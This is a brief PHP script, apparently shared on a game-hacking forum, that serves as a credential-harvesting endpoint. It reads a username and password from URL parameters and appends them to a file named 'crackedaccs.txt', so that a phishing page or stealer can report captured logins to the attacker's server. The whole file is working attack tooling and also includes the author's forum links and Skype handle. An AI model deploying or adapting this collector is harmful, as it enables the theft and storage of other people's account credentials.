<?php
//By Ex0rPl4net (incorporated 12/4/2014)
//MPGH: http://www.mpgh.net/forum/member.php?u=1966281 (disabled mpgh account)
//skype: timothemaster1999 
//http://www.mpgh.net/forum/showthread.php?t=782607

//the link is (your domain)/writefile.php?user=$user&password=$pass
$theuser = $_GET["user"];
$thepassword = $_GET["password"];
$full = $theuser . ':' . $thepassword;
echo htmlentities($full); //Potential XSS
$file = 'crackedaccs.txt';
$current = file_get_contents($file);
$current .= "$full \n";

file_put_contents($file, $current, LOCK_EX);
?>
